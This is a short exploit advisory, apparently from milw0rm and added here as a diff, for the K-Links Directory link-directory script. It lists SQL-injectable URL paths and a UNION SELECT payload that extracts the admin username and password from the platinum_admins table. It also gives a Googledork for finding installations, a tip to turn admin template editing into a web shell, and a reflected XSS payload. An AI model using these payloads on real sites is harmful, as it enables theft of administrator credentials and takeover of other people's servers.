@@ -1,0 +1,51 @@
+================================================================================
+|| K-Links Directory SQL-INJECTION, XSS                          
+================================================================================
+
+Application: K-Links Directory
+------------
+
+Website: http://turn-k.net/k-links
+--------
+
+Version: Platinum (All)
+--------
+
+About: Script for starting a profitable link directory website offering full-featured directory of resources/links similar to Yahoo-style search engine. Price 79-169$.
+------
+
+Googledork: Powered By K-Links Directory
+-----------
+
+Demo: http://klinksdemo.com
+-----
+
+[ SQL-INJECTION ]
+
+http://host/report/-1[SQL]
+http://host/visit.php?id=-1[SQL]
+http://host/addreview/-1[SQL]
+http://host/refer/-1[SQL]
+
+===>>> Exploit:
+
+http://host/report/-1 union select 1,2,3,concat(a_pass,0x3a,a_user),5,6,7,8,9,1,2,3,4,5,6,7,8,9,1,2,3,4,5,6,7,8,9,1,2,3,4,5,6,7,8,9,1,2,3,4,5,6,7,8 from platinum_admins where a_id=1/*
+
+
+/* Admin Login -  http://host/admin 
+
+Manage Templates => web-shell */
+
+
+[ PASSIVE XSS  :)  ]
+
+http://host/index.php?req=login&redirect=&login_message=<script>alert()</script>
+
+
+Author: Corwin
+-------                                     
+	
+Contact: corwin88[dog]mail[dot]ru
+--------
+
+# milw0rm.com [2008-08-02]
